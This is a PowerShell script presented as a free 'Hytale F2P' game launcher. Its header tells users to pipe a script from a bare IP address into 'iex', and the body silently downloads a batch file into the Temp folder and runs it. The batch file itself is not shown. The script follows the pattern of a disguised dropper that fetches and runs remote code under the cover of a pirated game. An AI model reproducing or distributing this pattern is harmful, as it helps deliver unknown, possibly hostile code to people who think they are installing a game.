# HYTALE F2P - INSTANT LAUNCHER (Bootstrap)
# Run via: irm http://72.62.192.173:5000/launcher.ps1 | iex

$ProgressPreference = 'SilentlyContinue'
$API_HOST = "https://test"
$TARGET_BAT = "game launcher.bat"
$URL = "$API_HOST/file/$($TARGET_BAT -replace ' ', '%20')"
$DEST = Join-Path $env:TEMP $TARGET_BAT

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "       HYTALE F2P - INSTANT LAUNCH" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "`n[1/2] Fetching latest Hytale Launcher..." -ForegroundColor Gray

try {
    # Download the main batch file
    Invoke-WebRequest -Uri $URL -OutFile $DEST -UseBasicParsing
    Write-Host "[OK] Launcher downloaded to Temp." -ForegroundColor Green
    
    Write-Host "[2/2] Starting Hytale..." -ForegroundColor Cyan
    Start-Sleep -Seconds 1
    
    # Execute the batch file
    & $DEST
}
catch {
    Write-Host "[ERROR] Failed to download launcher from $URL" -ForegroundColor Red
    Write-Host "        Reason: $($_.Exception.Message)" -ForegroundColor Gray
    Write-Host "`nTip: Make sure the server is running and 'game launcher.bat' exists in the uploads folder." -ForegroundColor Yellow
    pause
}
